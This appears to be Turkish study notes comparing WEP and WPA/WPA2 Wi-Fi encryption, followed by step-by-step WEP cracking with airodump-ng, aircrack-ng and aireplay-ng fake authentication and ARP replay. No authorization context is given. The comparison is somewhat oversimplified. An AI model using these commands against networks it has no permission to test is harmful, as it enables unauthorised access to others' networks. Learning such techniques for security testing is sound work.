- Wifi ağları **WEP** ve **WPA/WPA2** ile şifreleme algoritmaları ile korunur.
---

## 🔐 WPA ve WEP Arasındaki Fark 
### 🧓 WEP (Wired Equivalent Privacy) – Eski ve Güvensiz 🚫

#### 🧠 Mantığı:
- Sabit bir **şifreleme anahtarı 🔑** kullanır.
- Bu anahtar herkes için **aynıdır**.
- **RC4** adında zayıf bir şifreleme algoritması kullanır.
- Her pakette **çok az değişiklik** olur → Kolayca **kırılır 🔨**.

#### ❌ Sorunları:
- 🔁 Şifre sürekli **aynı** → Kolay **tahmin edilir**.
- 👨‍💻 Hacker'lar birkaç dakika içinde **şifreyi çözebilir**.
- 📅 **1999 yılında** çıktı ama **artık güvenli değil**.

---

### ✅ WPA (Wi-Fi Protected Access) – Daha Güvenli 💪

#### 🧠 Mantığı:
- **Her kullanıcıya özel** bir şifreleme yöntemi kullanır 🔄.
- Dinamik olarak **şifre değiştirir 🔄🔐** (her paket farklı olabilir!).
- **TKIP** (Temporal Key Integrity Protocol) ile paket başına **farklı anahtar** üretir.
- WPA2 ile birlikte **AES 🔥** gibi güçlü algoritmalar kullanılır.

#### 👍 Avantajları:
- 📦 Her veri paketi için **farklı şifre** → Zor kırılır 🧱.
- 🕵️‍♂️ Hacker için iş **çok daha zor**.
- 🔒 Şifre **değişebilir**, sabit kalmaz.

---

### 🔍 Özetle:

| Özellik       | 🧓 WEP                      | 🧑 WPA                         |
|---------------|-----------------------------|--------------------------------|
| Şifreleme     | Sabit RC4 🔐                | TKIP (WPA) / AES (WPA2) 🔥     |
| Güvenlik      | Çok zayıf ❌                | Orta (WPA) / Yüksek (WPA2) ✅  |
| Şifre Değişimi| Yok 🔁                      | Var 🔁🔁🔁                       |
| Kırılması     | Çok kolay 🧨                | Çok zor 🛡️                    |

---

### 💡 Kısaca:
**WEP = Eski, sabit, zayıf 🔓**  
**WPA = Yeni, dinamik, güçlü 🔒**

---

## 🧨 WEP Kırma

### 1. 📡 Modemi Dinleme
- `airodump-ng` ile ağları dinle:
  ```bash
  airodump-ng <interface>
  ```
- Ekrandaki hedef modem bilgilerini (BSSID ve kanal) not al.
- Hedef ağı dinle ve yazdır :
  ```bash
  airodump-ng --channel <channel> --bssid <bssid> --write <txt> <interface>
  ```
### 2. 📥 Paket Toplama ve Şifreyi Kırma
- Dinleme sırasında `.cap` uzantılı bir dosya oluşur.
- Bu dosyayla şu komutu çalıştır:
  ```bash
  aircrack-ng dosya.cap
  ```
- 🗝️ Şifre doğrudan terminalde görünür!

⚠️ **Not:** Bu işlemin çalışması için ağda **aktif trafik** olması gerekir.

---

## 🕵️‍♂️ Fake Authentication (Sahte Kimlik Doğrulama)

Ağda yeterli trafik yoksa kendin oluşturabilirsin. İşte adımlar:

### 🔐 1. Sahte Bağlantı Kurma
```bash
aireplay-ng --fakeauth 0 -a (BSSID) -h (Wi-Fi kart MAC) (interface)
```
- 📡 Modeme sahte bir şekilde bağlanır.
- MAC adresini öğrenmek için:
  ```bash
  ip addr
  ```

### 🔁 2. ARP Replay ile Trafik Oluşturma
```bash
aireplay-ng --arpreplay -b (BSSID) -h (Wi-Fi kart MAC) (interface)
```
- 💣 Modemde **sahte veri trafiği** oluşturur.
- Bu sayede şifreleme kırılabilir hale gelir.
